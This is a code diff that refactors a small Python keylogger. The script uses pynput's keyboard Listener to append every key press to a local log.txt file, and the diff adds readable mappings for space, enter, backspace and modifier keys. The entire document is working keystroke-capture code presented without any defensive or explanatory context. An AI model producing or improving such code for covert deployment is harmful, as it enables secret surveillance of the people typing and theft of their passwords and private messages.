@@ -1,12 +1,25 @@
 from pynput.keyboard import Listener
 
 
-def writetofile(key):
+def write_to_file(key):
     letter = str(key)
-    letter = letter.replace("'","")
+    letter = letter.replace("'", "")
+
+    if letter == "Key.space":
+        letter = " "
+    if letter == "Key.shift_r":
+        letter = "<Shift_R>"
+    if letter == "Key.ctrl_l":
+        letter = ""
+    if letter == "Key.enter":
+        letter = "\n"
+    if letter == "Key.backspace":
+        letter = "<BS>"
+
+
     with open("log.txt", "a") as f:
         f.write(letter)
 
 
-with Listener(on_press=writetofile) as l:
+with Listener(on_press=write_to_file) as l:
     l.join()
